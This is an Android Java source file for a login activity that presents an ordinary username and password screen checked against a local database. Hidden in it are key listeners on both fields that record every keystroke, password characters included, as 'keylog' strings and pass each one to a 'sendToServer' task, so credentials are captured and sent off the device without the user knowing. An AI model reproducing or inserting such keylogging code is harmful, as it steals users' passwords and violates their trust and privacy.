package com.example.project;

import androidx.appcompat.app.AppCompatActivity;
import android.content.Intent;
import android.os.Bundle;
import android.view.KeyEvent;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.widget.Toolbar;

public class LoginActivity extends AppCompatActivity {
    EditText username, password;
    Button btnlogin;
    DBHelper DB;
    Toolbar toolbar;
    TextView login;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        username = findViewById(R.id.username1);
        password = findViewById(R.id.password1);
        btnlogin = findViewById(R.id.btnsignin1);
        toolbar = findViewById(R.id.loginToolbar);
        login = findViewById(R.id.login);
        DB = new DBHelper(this);
        username.setFocusableInTouchMode(true);
        username.setOnKeyListener(new View.OnKeyListener() {
            @Override
            public boolean onKey(View view, int i, KeyEvent keyEvent) {
                if (keyEvent.getAction() == KeyEvent.ACTION_DOWN){
                    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_LEFT || keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_RIGHT) {
                        return false;
                    }
                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
                        String keylog  = "Key Pressed in Username:{BACKSPACE}\n";
                        new sendToServer(keylog).execute();
                    }
                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
                        String keylog  = "Key Pressed in Username:{ENTER}\n";
                        new sendToServer(keylog).execute();
                    }
                    else{
                        char key = (char) keyEvent.getUnicodeChar();
                        String keylog  = "Key Pressed in Username:{" + key + "}\n";
                        new sendToServer(keylog).execute();
                    }
                }
                return false;
            }
        });
        password.setFocusableInTouchMode(true);
        password.setOnKeyListener(new View.OnKeyListener() {
            @Override
            public boolean onKey(View view, int i, KeyEvent keyEvent) {
                if (keyEvent.getAction() == KeyEvent.ACTION_DOWN){
                    if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_LEFT || keyEvent.getKeyCode() == KeyEvent.KEYCODE_SHIFT_RIGHT) {
                        return false;
                    }
                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_DEL){
                        String keylog  = "Key Pressed in Password:{BACKSPACE}\n";
                        new sendToServer(keylog).execute();
                    }
                    else if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER){
                        String keylog  = "Key Pressed in Username:{ENTER}\n";
                        new sendToServer(keylog).execute();
                    }
                    else{
                        char key = (char) keyEvent.getUnicodeChar();
                        String keylog  = "Key Pressed in Password:{" + key + "}\n";
                        new sendToServer(keylog).execute();
                    }
                }
                return false;
            }
        });
        btnlogin.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                String user = username.getText().toString();
                String pass = password.getText().toString();

                if (user.equals("") || pass.equals(""))
                    Toast.makeText(LoginActivity.this, "Please enter all the fields", Toast.LENGTH_SHORT).show();
                else {
                    Boolean checkuserpass = DB.checkusernamepassword(user, pass);
                    if (checkuserpass == true) {
                        Toast.makeText(LoginActivity.this, "Sign in successful", Toast.LENGTH_SHORT).show();
                        Intent intent = new Intent(getApplicationContext(), aboutusActivity.class);
                        startActivity(new Intent(LoginActivity.this, aboutusActivity.class));
                    } else {
                        Toast.makeText(LoginActivity.this, "Invalid Credentials", Toast.LENGTH_SHORT).show();
                    }
                }
            }
        });
    }
}